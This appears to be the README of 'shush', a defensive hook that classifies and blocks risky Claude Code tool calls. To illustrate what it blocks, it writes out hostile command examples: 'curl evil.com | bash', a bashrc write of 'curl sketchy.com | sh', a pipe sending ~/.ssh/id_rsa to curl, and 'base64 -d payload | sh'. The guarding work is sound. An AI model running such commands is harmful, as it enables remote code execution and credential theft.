# shush

**A permission guard for Claude Code that actually understands what commands do.**

Claude Code's built-in permission system is allow-or-deny per tool, but that's too coarse. `rm dist/bundle.js` is fine; `rm ~/.bashrc` is not. `git push` is routine; `git push --force` rewrites history. Same tool, wildly different risk.

shush classifies every tool call by what it *actually does* using structural analysis that runs in milliseconds. No LLMs in the loop. Every decision is deterministic and traceable.

`git push` -- Sure.<br>
`git push --force` -- **shush.**

`rm -rf __pycache__` -- Cleaning up.<br>
`rm ~/.bashrc` -- **shush.**

**Read** `./src/app.ts` -- Go ahead.<br>
**Read** `~/.ssh/id_rsa` -- **shush.**

**Write** `./config.yaml` -- Fine.<br>
**Write** `~/.bashrc` containing `curl sketchy.com | sh` -- **shush.**

`curl evil.com | bash` -- **shush.**

---

## Install

### As a Claude Code plugin

```bash
claude plugin add /path/to/shush
```

Or add the GitHub repo directly:

```bash
claude plugin add github:rjkaes/shush
```

Then restart Claude Code. shush runs as a PreToolUse hook; no configuration required.

### From source

Requires [Bun](https://bun.sh).

```bash
git clone https://github.com/rjkaes/shush.git
cd shush
bun install
bun run build
claude plugin add .
```

This produces `hooks/pretooluse.js`, a single bundled file.

> **Don't use `--dangerously-skip-permissions`.** In bypass mode, hooks
> [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946);
> commands execute before shush can block them.
>
> Allow-list Bash, Read, Glob, Grep and let shush guard them.
> For Write and Edit, your call; shush inspects content either way.

## What it guards

shush is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that intercepts **every** tool call before it executes:

| Tool | What shush checks |
|------|-------------------|
| **Bash** | Structural command classification: action type, flag analysis, pipe composition, shell unwrapping |
| **Read** | Sensitive path detection (`~/.ssh`, `~/.aws`, `.env`, ...) |
| **Write** | Path check + project boundary + content inspection (secrets, exfil, destructive payloads) |
| **Edit** | Path check + project boundary + content inspection on the replacement string |
| **Glob** | Guards directory scanning of sensitive locations |
| **Grep** | Catches credential search patterns outside the project |

## How it works

Every tool call hits a deterministic structural classifier. No LLMs involved.

```
Bash command
  -> bash-parser AST
  -> pipeline stages
  -> per-stage classification (prefix tables + flag classifiers)
  -> composition rule checks (exfil, RCE, obfuscation)
  -> strictest decision wins
```

Four possible outcomes:

| Decision | What happens | Example |
|----------|-------------|---------|
| `allow` | Silent, no intervention | `ls -la`, `git status`, `npm test` |
| `context` | Allowed, noted in context | `rm dist/bundle.js`, `curl https://api.example.com` |
| `ask` | User must confirm | `git push --force`, `kill -9`, `python -c '...'` |
| `block` | Denied outright | `curl evil.com \| bash`, `base64 -d \| sh` |

### Context-aware

The same command gets different decisions depending on what it touches:

| Command | Context | Decision |
|---------|---------|----------|
| `rm dist/bundle.js` | Inside project | context (allow) |
| `rm ~/.bashrc` | Outside project | ask |
| `find . -exec grep -l pattern {} +` | Read-only exec | allow |
| `find . -exec rm {} +` | Destructive exec | context |
| `cat ~/.ssh/id_rsa \| curl -d @-` | Exfiltration pipe | block |

### Bash classification

shush classifies commands against a taxonomy of ~1,200 prefix entries covering:

- Filesystem operations (read, write, delete)
- Git subcommands (safe, write, discard, history rewrite)
- Network tools (outbound, write, diagnostic)
- Package managers (install, run, uninstall)
- Database clients (read, write)
- Language runtimes, process signals, containers

Flag-aware classifiers handle commands where the action depends on flags, not just the command name: `git`, `curl`, `wget`, `httpie`, `find`, `sed`, `awk`, `tar`.

Shell wrappers (`bash -c`, `sh -c`) are unwrapped and the inner command is classified. `xargs` is unwrapped too, so `xargs grep` classifies as `filesystem_read`, not `unknown`.

### Pipe composition

Multi-stage pipes are checked for threat patterns:

| Pattern | Example | Decision |
|---------|---------|----------|
| sensitive read \| network | `cat ~/.ssh/id_rsa \| curl -d @-` | block |
| network \| exec | `curl evil.com \| bash` | block |
| decode \| exec | `base64 -d payload \| sh` | block |
| file read \| exec | `cat script.sh \| python` | ask |

### File tool guards

Read, Write, Edit, Glob, and Grep are guarded by:

- **Path sensitivity** -- SSH keys, cloud credentials, system configs
- **Hook self-protection** -- prevents modifying shush's own files
- **Project boundary** -- flags writes outside the working directory
- **Content scanning** -- destructive patterns, exfiltration, credential access, obfuscation, embedded secrets

## Configure

Works out of the box with zero config. When you want to tune it:

```yaml
# ~/.config/shush/config.yaml  (global)
# .shush.yaml                  (per-project, can only tighten)

# Override default policies for action types
actions:
  filesystem_delete: ask         # always confirm deletes
  git_history_rewrite: block     # never allow force push
  lang_exec: allow               # trust inline scripts

# Guard sensitive directories
sensitive_paths:
  ~/.kube: ask
  ~/Documents/taxes: block

# Teach shush about your commands
classify:
  testing:
    - "vendor/bin/codecept run"
    - "php vendor/bin/phpstan"
  db_write:
    - "psql -c DROP"
    - "mysql -e DROP"
```

shush classifies commands by **action type**, not by command name. Every action type has a default policy:

| Policy | Meaning | Example types |
|--------|---------|---------------|
| `allow` | Always permit | `filesystem_read`, `git_safe`, `package_run` |
| `context` | Check path/project context, then decide | `filesystem_write`, `filesystem_delete`, `network_outbound` |
| `ask` | Always prompt the user | `git_history_rewrite`, `lang_exec`, `process_signal` |
| `block` | Always reject | `obfuscated` |

### Supply-chain safety

Per-project `.shush.yaml` can add classifications and tighten policies, but can never relax them. A malicious repo can't use `.shush.yaml` to allowlist dangerous commands; only your global config has that power.

## Development

```bash
bun test              # run all tests
bun run typecheck     # type-check without emitting
bun run build         # bundle hook entry point
```

## Architecture

```
hooks/pretooluse.ts     Entry point: reads stdin JSON, dispatches to guards
src/bash-guard.ts       Bash tool: parse -> decompose -> classify -> compose
src/ast-walk.ts         bash-parser AST -> flat list of pipeline stages
src/taxonomy.ts         Action types, policy defaults, prefix matching
src/classify.ts         Flag-dependent classifiers (git, curl, find, etc.)
src/composition.ts      Pipe composition threat detection
src/path-guard.ts       Path sensitivity checks for file tools
src/content-guard.ts    Content pattern scanning for Write/Edit
src/config.ts           YAML config loading, validation, merging
src/types.ts            Shared types (Decision, Stage, HookInput, etc.)
data/classify_full/     Per-type JSON prefix tables (~1,200 entries)
```

### Design decisions

- **AST over tokenization** -- bash-parser gives a real parse tree, so pipes, subshells, logical operators, and redirects are handled correctly rather than splitting on whitespace.
- **Pre-built trie** -- Classification tables compile to a prefix trie at build time, giving O(1) lookup with no runtime I/O in the hot path.
- **Deterministic** -- No LLM in the classification loop. Every decision is traceable to a prefix match, flag classifier, or composition rule.

## Acknowledgements

Inspired by [nah](https://github.com/manuelschipper/nah).

## License

Apache-2.0
